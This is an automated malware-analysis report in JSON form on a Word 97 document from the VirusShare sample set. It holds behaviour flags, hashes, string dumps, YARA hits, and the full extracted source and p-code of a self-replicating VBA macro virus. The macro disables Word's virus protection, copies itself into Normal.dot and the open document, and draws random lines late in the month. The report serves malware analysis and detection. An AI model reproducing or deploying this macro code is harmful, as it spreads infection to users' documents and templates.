{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "AddFromString": "May attempt to modify the VBA code",
            "Call": "May call a DLL using Excel 4 Macros",
            "CodeModule": "May attempt to modify the VBA code",
            "Document_Close": "Runs when the Word document is closed",
            "Document_Open": "Runs when the Word or Publisher document is opened",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code"
        },
        "macro": "'Esta Infectado\nPrivate Sub Document_Close()\nOn Error Resume Next\n\nDim i, x1, x2, y1, y2 As Integer\nDim Figura\n\n\nCall Document_Open\n\nRandomize\nIf Day(Now()) > 23 Then\n\n  For i = 1 To 100\n    x1 = Int(1000 * Rnd(1000))\n    x2 = Int(1000 * Rnd(1000))\n    y1 = Int(1000 * Rnd(1000))\n    y2 = Int(1000 * Rnd(1000))\n    Figura = ActiveDocument.Shapes.AddLine(x1, y1, x2, y2)\n  Next i\nEnd If\n\nActiveDocument.Save\nNormalTemplate.Save\n\nEnd Sub\n\nPrivate Sub Document_Open()\nOn Error Resume Next\n\nDim ad, nt As Object\nDim MiCodigo As String\nDim DocInfectado As Boolean\nDim NormalInfectado As Boolean\n\nOptions.VirusProtection = False\n\n'Inicializar Variables\nSet ad = ActiveDocument.VBProject.VBComponents.Item(1)\nSet nt = NormalTemplate.VBProject.VBComponents.Item(1)\n\nMiCodigo = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)\nIf Len(MiCodigo) < 1 Then\n   MiCodigo = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)\nEnd If\n\nDim EsteCogigo As String\n    EsteCodigo = Mid(MiCodigo, 1, Len(MiCodigo))\n\nnt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines\nnt.CodeModule.AddFromString EsteCodigo\n\nad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines\nad.CodeModule.AddFromString EsteCodigo\n\nNormalTemplate.Save\nActiveDocument.Save\nEnd Sub\n\n\n' Processing file: VirusShare_084067dc29fc56db8c58acd77eec7a50\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 6074 bytes\n' Line #0:\n' \tQuoteRem 0x0000 0x000E \"Esta Infectado\"\n' Line #1:\n' \tFuncDefn (Private Sub Document_Close())\n' Line #2:\n' \tOnError (Resume Next) \n' Line #3:\n' Line #4:\n' \tDim \n' \tVarDefn i\n' \tVarDefn x1\n' \tVarDefn x2\n' \tVarDefn y1\n' \tVarDefn y2 (As Integer)\n' Line #5:\n' \tDim \n' \tVarDefn Figura\n' Line #6:\n' Line #7:\n' Line #8:\n' \tArgsCall (Call) Document_Open 0x0000 \n' Line #9:\n' Line #10:\n' \tArgsCall Read 0x0000 \n' Line #11:\n' \tArgsLd Now 0x0000 \n' \tArgsLd Day 0x0001 \n' \tLitDI2 0x0017 \n' \tGt \n' \tIfBlock \n' Line #12:\n' Line #13:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0064 \n' \tFor \n' Line #14:\n' \tLitDI2 0x03E8 \n' \tLitDI2 0x03E8 \n' \tArgsLd Rnd 0x0001 \n' \tMul \n' \tFnInt \n' \tSt x1 \n' Line #15:\n' \tLitDI2 0x03E8 \n' \tLitDI2 0x03E8 \n' \tArgsLd Rnd 0x0001 \n' \tMul \n' \tFnInt \n' \tSt x2 \n' Line #16:\n' \tLitDI2 0x03E8 \n' \tLitDI2 0x03E8 \n' \tArgsLd Rnd 0x0001 \n' \tMul \n' \tFnInt \n' \tSt y1 \n' Line #17:\n' \tLitDI2 0x03E8 \n' \tLitDI2 0x03E8 \n' \tArgsLd Rnd 0x0001 \n' \tMul \n' \tFnInt \n' \tSt y2 \n' Line #18:\n' \tLd x1 \n' \tLd y1 \n' \tLd x2 \n' \tLd y2 \n' \tLd ActiveDocument \n' \tMemLd Shapes \n' \tArgsMemLd AddLine 0x0004 \n' \tSt Figura \n' Line #19:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #20:\n' \tEndIfBlock \n' Line #21:\n' Line #22:\n' \tLd ActiveDocument \n' \tArgsMemCall Save 0x0000 \n' Line #23:\n' \tLd NormalTemplate \n' \tArgsMemCall Save 0x0000 \n' Line #24:\n' Line #25:\n' \tEndSub \n' Line #26:\n' Line #27:\n' \tFuncDefn (Private Sub Document_Open())\n' Line #28:\n' \tOnError (Resume Next) \n' Line #29:\n' Line #30:\n' \tDim \n' \tVarDefn ad\n' \tVarDefn nt (As Object)\n' Line #31:\n' \tDim \n' \tVarDefn MiCodigo (As String)\n' Line #32:\n' \tDim \n' \tVarDefn DocInfectado (As Boolean)\n' Line #33:\n' \tDim \n' \tVarDefn NormalInfectado (As Boolean)\n' Line #34:\n' Line #35:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt VirusProtection \n' Line #36:\n' Line #37:\n' \tQuoteRem 0x0000 0x0015 \"Inicializar Variables\"\n' Line #38:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tSet ad \n' Line #39:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tSet nt \n' Line #40:\n' Line #41:\n' \tLitDI2 0x0001 \n' \tLd ad \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tLd ad \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tSt MiCodigo \n' Line #42:\n' \tLd MiCodigo \n' \tFnLen \n' \tLitDI2 0x0001 \n' \tLt \n' \tIfBlock \n' Line #43:\n' \tLitDI2 0x0001 \n' \tLd nt \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tLd nt \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tSt MiCodigo \n' Line #44:\n' \tEndIfBlock \n' Line #45:\n' Line #46:\n' \tDim \n' \tVarDefn EsteCogigo (As String)\n' Line #47:\n' \tLd MiCodigo \n' \tLitDI2 0x0001 \n' \tLd MiCodigo \n' \tFnLen \n' \tArgsLd Mid$ 0x0003 \n' \tSt EsteCodigo \n' Line #48:\n' Line #49:\n' \tLitDI2 0x0001 \n' \tLd nt \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tLd nt \n' \tMemLd CodeModule \n' \tArgsMemCall DeleteLines 0x0002 \n' Line #50:\n' \tLd EsteCodigo \n' \tLd nt \n' \tMemLd CodeModule \n' \tArgsMemCall AddFromString 0x0001 \n' Line #51:\n' Line #52:\n' \tLitDI2 0x0001 \n' \tLd ad \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tLd ad \n' \tMemLd CodeModule \n' \tArgsMemCall DeleteLines 0x0002 \n' Line #53:\n' \tLd EsteCodigo \n' \tLd ad \n' \tMemLd CodeModule \n' \tArgsMemCall AddFromString 0x0001 \n' Line #54:\n' Line #55:\n' \tLd NormalTemplate \n' \tArgsMemCall Save 0x0000 \n' Line #56:\n' \tLd ActiveDocument \n' \tArgsMemCall Save 0x0000 \n' Line #57:\n' \tEndSub \n' Line #58:\n"
    },
    "filename": "VirusShare_084067dc29fc56db8c58acd77eec7a50",
    "filesize": 35840,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Author: Rose, Template: Normal.dot, Last Saved By: fs080298, Revision Number: 5, Name of Creating Application: Microsoft Word 8.0, Total Editing Time: 01:00, Create Time/Date: Tue Jul 25 05:49:00 2000, Last Saved Time/Date: Tue Apr 11 06:38:00 2000, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "084067dc29fc56db8c58acd77eec7a50",
        "sha1": "0b23ae884033534d59b6fefa864cce3792248e76",
        "sha256": "bbed7cb46259b2f7e43375226338267eb89358c262c5172bb8c4a00ef44aeaee"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj\u064e",
            " t,x",
            "/ =!",
            "GF[DF",
            "Rose",
            "Normal.dot",
            "fs080298",
            "Microsoft Word 8.0",
            "Title",
            "_PID_GUID",
            "@&|,x",
            " t,x",
            "@c,x",
            "Esta Infectado",
            "Inicializar Variables",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "'Esta In",
            "fectado",
            "P $ Sub\" ",
            "}_Cl=()",
            "On Err@or Res ",
            "Next",
            "Dim i, xB1",
            "2, y",
            "2 As,teg",
            "Figur",
            "Call!",
            "0Open",
            "ndQ~If D",
            "ay(Now()",
            ") > 23 Th",
            "1 To 100H",
            "0 * hRnd",
            "4=A4",
            "ActaO.S",
            "hapes.AddLine(AIAH",
            "xAJ2&Q i",
            "End IfAB9",
            "avDE{.S",
            "oAW]oa d, ntlOb",
            "ClMiCod(igo",
            "Bool|eap",
            "tions.VirusProt",
            "'In icialr ",
            "Varis",
            "`Set a",
            "-.VBCo",
            "mpons.Item(1W",
            "6L= O",
            ".`!eModuHle.",
            "9s(\\a",
            "CountO",
            "`XLen(",
            ") <  VXQ",
            "gE.xeCogl5^#",
            "A8= Mid",
            "Delete",
            "]FromF ",
            "L=Cej(Sub",
            "nj\\5",
            "njL5",
            "nj<5",
            "np:5",
            "Q@l)",
            "`1d6",
            "`1d6",
            ")ldJi0",
            "1b38f2ba58",
            "Wordk",
            "Win16~",
            "Win32",
            "goat97=",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Documentj",
            "Document_Close7\\",
            "y1O_",
            "y2P_",
            "Figuraf",
            "Document_Open",
            "Now%",
            "RndR",
            "ActiveDocument\\",
            "Shapes<",
            "AddLine",
            "Save",
            "NormalTemplateq",
            "ad~\\",
            "nto^",
            "MiCodigom",
            "DocInfectado",
            "NormalInfectadoZ",
            "Options",
            "VirusProtectionoD",
            "VBProjectOh",
            "VBComponents",
            "Itemz",
            "CodeModule",
            "Lines",
            "CountOfLines!\\",
            "EsteCogigo",
            "EsteCodigoP",
            "DeleteLines",
            "AddFromString",
            "_B_var_Midp",
            "_B_var_EsteCodigo",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WIN95\\S",
            "YSTEM\\ST",
            "DOLE2.TL",
            " Auto@mation",
            "MSForm",
            "32E2C68-",
            "6488-11D@4-AF23",
            "008661B9",
            "2.TWD#",
            "Microsof",
            "^ Ob",
            " Library",
            "OB*OIP\\VBE\\",
            "(EX'(",
            "vN@TalvNESa@w",
            " @+\tB,C",
            "eAOffic\u0107OD",
            "G{2DF",
            "8D04C-5B",
            "FA-101B-BDE5",
            "ePROG",
            "RAM FILE",
            "S\\MICROS",
            "OFT OFFI",
            "MSO9`7.DLLj# (8.0",
            "isDocument",
            "*\\CNormalrU",
            "goat97",
            "ThisDocument",
            "Project",
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD8.OLB",
            "Word",
            "C:\\WIN95\\SYSTEM\\STDOLE2.TLB",
            "stdole",
            "Document",
            "Document_Close",
            "C:\\WIN95\\SYSTEM\\MSForms.TWD",
            "MSForms",
            "C:\\WIN95\\TEMP\\VBE\\MSForms.EXD",
            "C:\\PROGRAM FILES\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL",
            "Office",
            "Document_Open",
            "VBA332.DLL",
            "CodeModule",
            "CountOfLines",
            "Lines",
            "DeleteLines",
            "AddFromStringX",
            "ThisDocument",
            "ID=\"{36C77B22-0FBF-11D4-AF24-006008661B9B}\"",
            "Document=ThisDocume",
            "nt/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"3E3C8762896E2472247224722472\"",
            "DPB=\"D5D76C07949F959F959F\"",
            "GC=\"6C6ED5B0FB46FC46FCB9\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL": "Library",
            "C:\\PROGRAM FILES\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL": "Library",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD8.OLB": "Autogen",
            "VBA332.DLL": "Library"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.300632",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
